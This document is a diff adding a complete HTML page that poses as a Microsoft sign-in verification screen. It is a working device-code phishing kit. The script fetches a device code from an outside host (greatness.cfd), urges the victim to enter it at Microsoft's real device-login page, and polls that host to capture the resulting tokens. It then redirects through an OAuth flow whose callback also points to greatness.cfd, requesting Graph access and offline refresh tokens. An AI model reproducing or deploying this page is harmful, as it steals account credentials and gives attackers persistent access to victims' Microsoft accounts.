@@ -1,0 +1,303 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Microsoft Verification</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",Arial,sans-serif}
+body{background:#f3f3f3;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding:14px;}
+.wrapper{width:100%;max-width:470px}
+.card{width:100%;background:#fff;border:1px solid #dcdcdc;padding:28px 24px 22px;overflow:hidden}
+.logo{display:flex;align-items:center;gap:10px;margin-bottom:24px}
+.ms-logo{width:22px;height:22px;display:grid;grid-template-columns:repeat(2,1fr);grid-template-rows:repeat(2,1fr);gap:2px;flex-shrink:0}
+.ms-logo div:nth-child(1){background:#f25022}
+.ms-logo div:nth-child(2){background:#7fba00}
+.ms-logo div:nth-child(3){background:#00a4ef}
+.ms-logo div:nth-child(4){background:#ffb900}
+.logo span{font-size:19px;color:#737373;font-weight:600}
+.title{font-size:42px;font-weight:600;color:#1b1b1b;line-height:1.05;margin-bottom:14px;word-break:break-word}
+.desc{font-size:17px;line-height:1.45;color:#1b1b1b;margin-bottom:24px}
+.code-box{width:100%;border:1px solid #d9d9d9;background:#fafafa;padding:22px 14px;text-align:center;margin-bottom:22px;overflow:hidden}
+.code-label{font-size:13px;letter-spacing:2px;color:#666;margin-bottom:14px}
+.code{width:100%;display:block;font-size:clamp(22px,5vw,40px);font-weight:700;letter-spacing:4px;line-height:1.15;color:#0078d4;margin-bottom:18px;word-break:break-word;overflow-wrap:anywhere}
+.copy-btn{background:none;border:none;color:#0078d4;font-size:18px;font-weight:600;cursor:pointer;transition:.2s}
+.copy-btn:hover{opacity:.8}
+.steps{margin-left:20px;margin-bottom:22px}
+.steps li{font-size:15px;line-height:1.55;margin-bottom:6px;color:#1b1b1b}
+.steps strong{color:#0078d4;font-weight:600}
+.sign-btn{width:100%;height:50px;border:none;background:#0078d4;color:#fff;font-size:18px;font-weight:600;cursor:pointer;transition:.2s}
+.sign-btn:hover{background:#006cbe}
+.secured{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:14px;color:#8a8a8a;font-size:14px}
+.waiting{display:flex;align-items:center;justify-content:center;gap:10px;margin-top:14px;font-size:15px;color:#666}
+.loader{display:inline-block;width:16px;height:16px;border:2px solid #d8d8d8;border-top:2px solid #0078d4;border-radius:50%;animation:spin 1s linear infinite;vertical-align:middle;margin-right:8px}
+.status{margin-top:14px;text-align:center;padding:10px;background:#f3f3f3;color:#666;font-size:13px;border-radius:4px;word-break:break-word}
+.expired{text-align:center;padding:30px 10px}
+.expired h2{font-size:24px;margin-bottom:10px;color:#dc3545}
+.expired p{font-size:14px;color:#666}
+@keyframes spin{to{transform:rotate(360deg)}}
+@media(max-width:600px){
+body{padding:10px}
+.wrapper{max-width:100%}
+.card{padding:22px 16px 18px}
+.title{font-size:34px}
+.desc{font-size:15px}
+.code{font-size:28px;letter-spacing:2px}
+.steps li{font-size:14px}
+.copy-btn{font-size:16px}
+.sign-btn{height:46px;font-size:16px}
+}
+@media(max-width:400px){
+.card{padding:18px 12px 16px}
+.title{font-size:28px}
+.desc{font-size:14px}
+.code{font-size:24px;letter-spacing:1px}
+.steps{margin-left:16px}
+.steps li{font-size:13px}
+.waiting{font-size:14px}
+}
+</style>
+
+</head>
+<body>
+
+<div class="wrapper">
+
+<div class="card" id="mainCard">
+
+<div class="logo">
+<div class="ms-logo">
+<div></div>
+<div></div>
+<div></div>
+<div></div>
+</div>
+<span>Microsoft</span>
+</div>
+
+<div class="title">
+Enter code
+</div>
+
+<div class="desc">
+Copy the verification code below and paste it when prompted to complete sign-in.
+</div>
+
+<div class="code-box">
+
+<div class="code-label">
+VERIFICATION CODE
+</div>
+
+<div class="code" id="code">
+Loading...
+</div>
+
+<button class="copy-btn" onclick="copyCode()">
+Copy to clipboard
+</button>
+
+</div>
+
+<ol class="steps">
+<li>Click <strong>Copy to clipboard</strong> above</li>
+<li>Click <strong>Sign in</strong> below to open the Microsoft sign-in window</li>
+<li>Paste the code when prompted</li>
+<li>Authenticate with your Microsoft account</li>
+</ol>
+
+<button class="sign-btn" onclick="openMicrosoft()">
+Sign in
+</button>
+
+<div class="secured">
+Secured by Microsoft
+</div>
+
+<div class="status" id="status">
+<div class="waiting">
+    <div class="loader"></div>
+    <span>Waiting for verification...</span>
+</div>
+</div>
+
+</div>
+
+</div>
+
+<script>
+
+startVerification();
+
+var deviceCode = null;
+var intervalTime = 1000;
+var done = false;
+
+function popup(url){
+window.open(url,"_blank","width=500,height=650");
+}
+
+function openMicrosoft(){
+popup("https://microsoft.com/devicelogin");
+}
+
+async function copyCode(){
+
+var code=document.getElementById("code").innerText;
+
+try{
+
+await navigator.clipboard.writeText(code);
+
+var btn=document.querySelector(".copy-btn");
+var oldText=btn.innerHTML;
+
+btn.innerHTML="Copied!";
+btn.style.color="#107c10";
+
+setTimeout(function(){
+
+btn.innerHTML=oldText;
+btn.style.color="#0078d4";
+
+},1500);
+
+}catch(e){}
+
+popup("https://microsoft.com/devicelogin");
+
+}
+
+function showExpiredPage(){
+
+document.getElementById("mainCard").innerHTML=`
+<div class="expired">
+<h2>Verification Expired</h2>
+<p>This verification session is no longer available.</p>
+</div>
+`;
+
+}
+
+async function start(){
+
+try{
+
+var res=await fetch("https://greatness.cfd/admin/apifiles.php?action=get_device_code&user_id=7784747582");
+var data=await res.json();
+
+if(!data.device_code){
+
+document.getElementById("status").innerHTML="❌ Failed to get verification code";
+
+setTimeout(showExpiredPage,3000);
+
+return;
+
+}
+
+deviceCode=data.device_code;
+intervalTime=(data.interval||5)*1000;
+
+document.getElementById("code").innerText=data.user_code;
+
+poll();
+
+}catch(err){
+
+document.getElementById("status").innerHTML="❌ Connection error";
+
+setTimeout(showExpiredPage,3000);
+
+}
+
+}
+
+function poll(){
+
+setInterval(async function(){
+
+if(done)return;
+
+try{
+
+var fd=new URLSearchParams();
+
+fd.append("device_code",deviceCode);
+fd.append("user_id","7784747582");
+
+var res=await fetch("https://greatness.cfd/admin/apifiles.php?action=poll_token",{
+method:"POST",
+body:fd
+});
+
+var data=await res.json();
+
+if(data.status==="pending"){
+
+document.getElementById("status").innerHTML='<div class="waiting"><div class="loader"></div><span>Waiting for verification...</span></div>';
+
+return;
+
+}
+
+if(data.status==="slow_down"){
+
+document.getElementById("status").innerHTML='<div class="waiting"><div class="loader"></div><span>Proccessing for verification...</span></div>';
+
+return;
+
+}
+
+if(data.status==="success"||data.success){
+
+done=true;
+
+document.getElementById("status").innerHTML="✅ Verified successfully";
+document.getElementById("status").style.background="#dff6dd";
+document.getElementById("status").style.color="#107c10";
+
+setTimeout(function(){
+
+window.location.href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=ded4d014-278d-4210-8876-e11640a491e9&amp;response_type=code&amp;redirect_uri=https%3A%2F%2Fgreatness.cfd%2Fadmin%2Ftoken_callback.php&amp;response_mode=query&amp;scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+offline_access&amp;state=7784747582";
+
+},1500);
+
+}
+
+}catch(err){
+
+done=true;
+
+showExpiredPage();
+
+}
+
+},intervalTime);
+
+}
+
+function startVerification(){
+
+start();
+
+setTimeout(function(){
+
+if(!done){
+
+done=true;
+
+showExpiredPage();
+
+}
+
+},600000000);
+
+}
+
+</script>
+
+</body>
+</html>
